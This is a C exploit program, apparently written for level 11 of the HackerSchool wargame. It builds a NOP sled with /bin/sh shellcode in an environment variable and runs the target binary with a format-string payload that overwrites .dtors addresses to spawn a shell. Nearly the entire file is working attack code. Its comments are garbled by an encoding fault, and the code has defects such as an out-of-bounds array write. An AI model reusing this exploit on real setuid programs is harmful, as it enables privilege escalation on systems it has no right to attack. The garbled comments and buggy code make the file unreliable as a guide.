/*
 * Author : superdk@hanmail.net
 * DATA : exploit code level11 of hackerschool
 * LICENSE : GNU License
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define VICTIM					"/home/level11/attackme"
#define DEFAULT_OFFSET          0
#define DEFAULT_ADDR_SIZE		8
#define DEFAULT_BUFFER_SIZE     512
#define DEFAULT_SUPERDK_SIZE    2048
#define NOP       				0x90
#define HEX						16
#define FMTLEN					40

// ��ü��� �����Ű�� ���ڵ�
char shellcode[] =
	"\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
	"\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";

// ����������(SP) �� �������� �Լ�
unsigned long get_sp(void)
{
        __asm__("movl %esp, %eax");
}

// �Ҹ����� �޸� �ּ�
unsigned char retDtorB[] = "\\x10\\x96\\x04\\x08";
unsigned char retDtorF[] = "\\x12\\x96\\x04\\x08";

// �޸𸮿� �ִ� 16���� �ּҸ� %����c%n �� ���� �κп� �Է��� 10������ �ٲ�
int hexToDec(char *ptrHex)
{
    char hexBuf[HEX];

    sprintf(hexBuf, ptrHex);

    return strtol(hexBuf, NULL, HEX);
}

int main(int argc, char **argv)
{
	char    *ptr, *superdk;
	char    shAddr[DEFAULT_ADDR_SIZE + 1];
	char    cmdBuf[DEFAULT_BUFFER_SIZE];
	long    *addr_ptr, addr;
	int     offset=DEFAULT_OFFSET;
	int     i, superdksize=DEFAULT_SUPERDK_SIZE;
	int     chgDec[3];

	// ���ڵ带 �ø� ������ �ּҿ� ���� �޸� �Ҵ�
	if ( !(superdk = malloc(superdksize)))
	{
		printf("Can't allocate memory for superdksize");
		exit(0);
	}

	// ���ڵ��� �ּ� �о�ͼ� ȭ�鿡 ���
	addr = get_sp() - offset;
	printf("Using address: 0x%x\n", addr);
	sprintf(shAddr, "%x", addr);

	
	// ���ڵ� ���� Ȯ���� ���̱� ���ؼ�, ���ڵ� �տ� ����� NOP �߰�
	ptr = superdk;
	for(i = 0; i < superdksize - strlen(shellcode) - 1; i++)
		*(ptr++) = NOP;

	// NOP �ڿ� ���ڵ� �߰�
	for(i = 0; i < strlen(shellcode); i++)
		*(ptr++) = shellcode[i];

	// �迭�� ���� ��Ȯ�� �˷��ֱ� ���� ���ڿ��� �� ǥ��
	superdk[superdksize - 1] = '\0';

	// SUPERDK ��� ȯ�溯�������� ���ڵ带 ȯ�� ������ ���
	memcpy(superdk, "SUPERDK=", DEFAULT_ADDR_SIZE);
	putenv(superdk);

	// %����c%n �� �������� ���
	chgDec[0] = hexToDec(argv[2]);
	chgDec[1] = hexToDec(argv[3]);
	chgDec[3] = chgDec[0] - FMTLEN;

	if(chgDec[0] > chgDec[1])
	{
		chgDec[1] += hexToDec("10000");
		chgDec[1] = chgDec[1] - chgDec[0];
	}

	// ��ɾ� �ϼ�
	sprintf(cmdBuf, "%s $(printf \"AAAA%sAAAA%s\")%%8x%%8x%%8x%%%dc%%n%%%dc%%n", VICTIM, retDtorB, retDtorF, chgDec[3], chgDec[1]);
	
	// �ϼ��� ��ɾ� ����
	system(cmdBuf);
}
